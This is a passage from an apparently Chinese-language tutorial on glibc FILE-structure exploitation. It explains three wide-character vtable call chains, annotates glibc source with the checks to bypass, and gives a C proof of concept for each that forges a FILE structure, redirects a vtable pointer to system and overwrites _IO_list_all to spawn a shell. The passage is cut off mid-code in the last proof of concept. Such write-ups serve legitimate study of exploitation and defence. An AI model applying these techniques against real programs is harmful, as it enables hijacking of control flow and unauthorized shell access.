<li><code>_wide_data</code> 设置为可控堆地址 <code>A</code>，即满足 <code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足 <code>*(A + 0x18) = 0</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足 <code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足 <code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
<h3 id="函数调用链"><a href="#函数调用链" class="headerlink" title="函数调用链"></a><strong>函数调用链</strong></h3><p><code>_IO_wfile_overflow-&gt; _IO_wdoallocbuf-&gt; _IO_WDOALLOCATE-&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</code></p>
<p>详解：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x0800</span></span><br><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">        f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">        __set_errno (EBADF);</span><br><span class="line">        <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">    <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">        <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">            <span class="comment">/* 这里调用了 _IO_wdoallocbuf () 函数 */</span></span><br><span class="line">	  		_IO_wdoallocbuf (f);</span><br><span class="line">	  		_IO_free_wbackup_area (f);</span><br><span class="line">	  		_IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">                       f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line">			[...]</span><br><span class="line">		&#125;</span><br><span class="line">		[...]</span><br><span class="line">    &#125;</span><br><span class="line">	[...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED        0x0002</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">        <span class="comment">/*满足条件则会调用 _IO_WDOALLOCATE*/</span></span><br><span class="line">		<span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE(fp) != WEOF)</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">	_IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf, fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)</span></span><br></pre></td></tr></table></figure></div>

<p>这里会去调用 <code>FP-&gt;doallocate</code>，也就是我们 <code>struct _IO_jump_t</code> 偏移 <code>0x68</code> 的位置，我们可以将其截获为 <code>one_gadget</code>。</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a><strong>poc</strong></h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* binsh = <span class="string">&quot;  sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;puts;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x80ed0</span>;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span>* fake_FILE = (<span class="keyword">struct</span> _IO_FILE*) <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="type">size_t</span>* fake_vtable = (<span class="type">size_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span>* fake_wide_data = (<span class="keyword">struct</span> _IO_wide_data*)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">size_t</span>* _IO_list_all = (<span class="type">size_t</span>*)(libc_base + <span class="number">0x21A680</span>);</span><br><span class="line"></span><br><span class="line">    fake_FILE-&gt;_mode = <span class="number">0</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_write_ptr = (<span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_write_base = (<span class="type">char</span>*)<span class="number">0</span>;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE)[<span class="number">0xD8</span> / <span class="number">8</span>] = libc_base + <span class="number">0x2160C0</span>; <span class="comment">// vtable, 0x215F40, 0x216000</span></span><br><span class="line">    fake_FILE-&gt;_wide_data = fake_wide_data;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0xE0</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)fake_vtable;   <span class="comment">// _wide_data-&gt;_wide_vtable</span></span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0x18</span> / <span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">    fake_vtable[<span class="number">0x68</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)system;     <span class="comment">// _IO_WDOALLOCATE调用的函数指针，偏移量可通过查看汇编获取</span></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span>*)fake_FILE, binsh);</span><br><span class="line">    *(_IO_list_all) = (<span class="type">size_t</span>)fake_FILE;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="利用-IO-wfile-underflow-mmap函数控制程序执行流"><a href="#利用-IO-wfile-underflow-mmap函数控制程序执行流" class="headerlink" title="利用_IO_wfile_underflow_mmap函数控制程序执行流"></a>利用<code>_IO_wfile_underflow_mmap</code>函数控制程序执行流</h2><h3 id="相关配置-1"><a href="#相关配置-1" class="headerlink" title="相关配置"></a><strong>相关配置</strong></h3><p>对<code>_IO_FILE_plus</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~4</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>sh;</code>，注意前面有个空格</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li>
<li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_IO_save_base</code>设置为<code>0</code>或者合法的可被<code>free</code>的地址，即满足<code>*(A + 0x40) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
<h3 id="函数调用链-1"><a href="#函数调用链-1" class="headerlink" title="函数调用链"></a><strong>函数调用链</strong></h3><p><code>_IO_wfile_underflow_mmap-&gt; _IO_wdoallocbuf-&gt;_IO_WDOALLOCATE-&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</code></p>
<p>详解：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 这里有一个 bug? 直接搜和点击 _IO_wfile_underflow_mmap 都无法搜索到相关内容 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> *cd;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *read_stop;</span><br><span class="line">  <span class="comment">/* 需要绕过的点 if_1 */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">  &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">      <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 需要绕过的点 if_2 */</span></span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="comment">/* 需要绕过的点 if_3 */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	  &#123;</span><br><span class="line">          <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">          fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	  &#125;</span><br><span class="line">      <span class="comment">/* 需要调用到这里 */</span></span><br><span class="line">      _IO_wdoallocbuf (fp);</span><br><span class="line">  &#125;</span><br><span class="line">[...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED        0x0002</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* 需要绕过的点 if_4 */</span></span><br><span class="line">	<span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">/* 需要绕过的点 if_5 */</span></span><br><span class="line">	<span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">        <span class="comment">/*满足条件则会调用 _IO_WDOALLOCATE*/</span></span><br><span class="line">		<span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE(fp) != WEOF)</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">	_IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf, fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)</span></span><br></pre></td></tr></table></figure></div>

<h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a><strong>poc</strong></h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* binsh = <span class="string">&quot;  sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;puts;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x80ed0</span>;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span>* fake_FILE = (<span class="keyword">struct</span> _IO_FILE*) <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="type">size_t</span>* fake_vtable = (<span class="type">size_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span>* fake_wide_data = (<span class="keyword">struct</span> _IO_wide_data*)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">size_t</span>* _IO_list_all = (<span class="type">size_t</span>*)(libc_base + <span class="number">0x21A680</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// FSOP</span></span><br><span class="line">    fake_FILE-&gt;_mode = <span class="number">0</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_write_ptr = (<span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_write_base = (<span class="type">char</span>*)<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    fake_FILE-&gt;_IO_read_ptr = (<span class="type">char</span>*)<span class="number">0</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_read_end = (<span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE)[<span class="number">0xD8</span> / <span class="number">8</span>] = libc_base + <span class="number">0x216000</span>; <span class="comment">// vtable</span></span><br><span class="line">    fake_FILE-&gt;_wide_data = fake_wide_data;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0xE0</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)fake_vtable;   <span class="comment">// _wide_data-&gt;_wide_vtable</span></span><br><span class="line">    fake_vtable[<span class="number">0x68</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)system;     <span class="comment">// _IO_WDOALLOCATE调用的函数指针，偏移量可通过查看汇编获取</span></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span>*)fake_FILE, binsh);</span><br><span class="line">    *(_IO_list_all) = (<span class="type">size_t</span>)fake_FILE;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="利用-IO-wdefault-xsgetn函数控制程序执行流"><a href="#利用-IO-wdefault-xsgetn函数控制程序执行流" class="headerlink" title="利用_IO_wdefault_xsgetn函数控制程序执行流"></a>利用<code>_IO_wdefault_xsgetn</code>函数控制程序执行流</h2><p>这条链执行的条件是调用到_IO_wdefault_xsgetn时rdx寄存器，也就是第三个参数不为<code>0</code>。如果不满足这个条件，可选用其他链。</p>
<h3 id="相关配置-2"><a href="#相关配置-2" class="headerlink" title="相关配置"></a><strong>相关配置</strong></h3><p>对<code>_IO_FILE_plus</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>0x800</code></li>
<li><code>vtable</code>设置为<code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wdefault_xsgetn</code>即可。</li>
<li><code>_mode</code>设置为大于<code>0</code>，即满足<code>*(fp + 0xc0) &gt; 0</code></li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code>设置为<code>0</code>，即满足<code>*(A + 8) = *A</code></li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt; *(A + 0x18)</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></li>
</ul>
<h3 id="函数调用链-2"><a href="#函数调用链-2" class="headerlink" title="函数调用链"></a><strong>函数调用链</strong></h3><p><code>_IO_wdefault_xsgetn-&gt;__wunderflow-&gt;_IO_switch_to_wget_mode-&gt;_IO_WOVERFLOW-&gt;*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)</code></p>
<p>详解：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_wdefault_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* more 为第三个参数，即 rdx。*/</span></span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="type">wchar_t</span> *s = (<span class="type">wchar_t</span>*) data;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="comment">/* Data available. */</span></span><br><span class="line">      <span class="type">ssize_t</span> count = (fp-&gt;_wide_data-&gt;_IO_read_end</span><br><span class="line">                       - fp-&gt;_wide_data-&gt;_IO_read_ptr);</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">	  &#123;</span><br><span class="line">	    <span class="keyword">if</span> ((<span class="type">size_t</span>) count &gt; more)</span><br><span class="line">	      count = more;</span><br><span class="line">	    <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);</span><br><span class="line">	      fp-&gt;_wide_data-&gt;_IO_read_ptr += count;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">	      count = <span class="number">0</span>;</span><br><span class="line">	    <span class="keyword">else</span></span><br><span class="line">	    &#123;</span><br><span class="line">	       <span class="type">wchar_t</span> *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">	       <span class="type">int</span> i = (<span class="type">int</span>) count;</span><br><span class="line">	       <span class="keyword">while</span> (--i &gt;= <span class="number">0</span>)</span><br><span class="line">		     *s++ = *p++;</span><br><span class="line">	       fp-&gt;_wide_data-&gt;_IO_read_ptr = p;</span><br><span class="line">         &#125;</span><br><span class="line">         more -= count;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">/* 首先判断第三个参数 rdx 是否为 0，我们需要他进行第二个判断 */</span></span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || __wunderflow (fp) == WEOF)</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">__wunderflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* _mode &gt; 0 */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &lt; <span class="number">0</span> || (fp-&gt;_mode == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">1</span>) != <span class="number">1</span>))</span><br><span class="line">     <span class="keyword">return</span> WEOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_wget_mode (fp) == EOF) <span class="comment">// 调用这里</span></span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">  &#123;</span><br><span class="line">      _IO_switch_to_main_wget_area (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">	<span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (_IO_have_markers (fp))</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">save_for_wbackup</span> (fp, fp-&gt;_wide_data-&gt;_IO_read_end))</span><br><span class="line">		<span class="keyword">return</span> WEOF;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_wbackup_area (fp);</span><br><span class="line">  <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* 需要 _wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF) <span class="comment">// 调用 _IO_WOVERFLOW</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_backup_base;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">		  fp-&gt;_wide_data-&gt;_IO_read_end = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_base = fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    = fp-&gt;_wide_data-&gt;_IO_write_end = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_CURRENTLY_PUTTING;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="poc-2"><a href="#poc-2" class="headerlink" title="poc"></a><strong>poc</strong></h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* binsh = <span class="string">&quot;sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;puts;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x80ed0</span>;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span>* fake_FILE = (<span class="keyword">struct</span> _IO_FILE*) <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="type">size_t</span>* fake_vtable = (<span class="type">size_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span>* fake_wide_data = (<span class="keyword">struct</span> _IO_wide_data*)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">size_t</span>* _IO_list_all = (<span class="type">size_t</span>*)(libc_base + <span class="number">0x21A680</span>);</span><br><span class="line"></span><br><span class="line">    fake_FILE-&gt;_mode = <span class="number">1</span>;</span><br><span class="line">    fake_FILE-&gt;_wide_data = fake_wide_data;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE)[<span class="number">0xD8</span> / <span class="number">8</span>] = libc_base + <span class="number">0x215A00</span> + <span class="number">0x3C0</span> + <span class="number">0x40</span> - <span class="number">0x18</span>; <span class="comment">// _IO_wstrn_jumps</span></span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0xE0</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)fake_vtable;   <span class="comment">// _wide_data-&gt;_wide_vtable</span></span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0x20</span> / <span class="number">8</span>] = <span class="number">1</span>;     <span class="comment">// _wide_data-&gt;_IO_write_ptr, o+0x20</span></span><br><span class="line">    fake_vtable[<span class="number">0x18</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)system;     <span class="comment">// _IO_WOVERFLOW调用的函数指针</span></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span>*)fake_FILE, binsh);   <span class="comment">// sh =&gt; 0x6873, 0x6873 &amp; 0x800 != 0</span></span><br><span 